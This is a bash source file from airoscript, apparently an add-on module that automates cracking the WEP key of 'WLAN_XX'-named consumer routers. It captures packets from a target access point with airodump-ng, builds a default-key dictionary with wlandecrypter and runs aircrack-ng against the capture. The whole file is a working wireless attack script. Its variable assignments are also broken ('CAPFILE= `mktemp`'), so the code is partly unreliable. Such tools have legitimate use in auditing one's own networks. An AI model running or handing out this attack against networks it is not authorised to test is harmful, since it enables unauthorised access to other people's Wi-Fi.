#!/bin/bash
# Unstable functions file for airoscript.
# Requires: wlandecrypter 
# By David Francos (XayOn) <yo.orco@gmail.com>
echo -e "\tUnstable functions from airoscript loaded,\n\tif you don't want this, set UNSTABLE=0 in\n\tconfig file"
function doitwld {
	airodump-ng -w $CAPFILE  $OPT $CHANNEL $WIFI
	wlandecrypter $Host_MAC $Host_SSID $DICFILE 
	aircrack-ng -b $Host_MAC -w $DICFILE $CAPFILE 
}

function wld {
# Here goes, if no host_mac is present, ask for it. Hope it's OK.	
	if [ $Host_MAC ] 
	then

		CAPFILE= `mktemp`
		DICFILE= `mktemp`
			echo  "______________________________________"
			echo  "# Do you want to specify a channel?  #"
			echo  "# If so, enter the channel, if not,  #"
			echo  "# leave it empty and press enter.    #"
			echo  "#____________________________________#"
			echo -n "Channel: "

			read CHANNEL
				if [ "$CHANNEL" != "" ]
				then
					OPT="--channel "
				fi

			sleep 1 
			case $Host_SSID in
				WLAN_[1-9][1-9] )
					echo "
	_____________________________________
	# Your wifi is the form WLAN_XX so  #
	# I'll try to launch airodump now   #
	# When you get sufficent ivs (data  #
	# packets, almost 10), press ctrl+c #
	#___________________________________#				
	"
					doitwld
					;;
				*)
					echo "Sorry, your target is not supported (not wlan_XX type)"
					;;
			esac
				
	else
		clear
		echo -e "Error: You must select a client before performing this attack.\n"
	fi
	
}
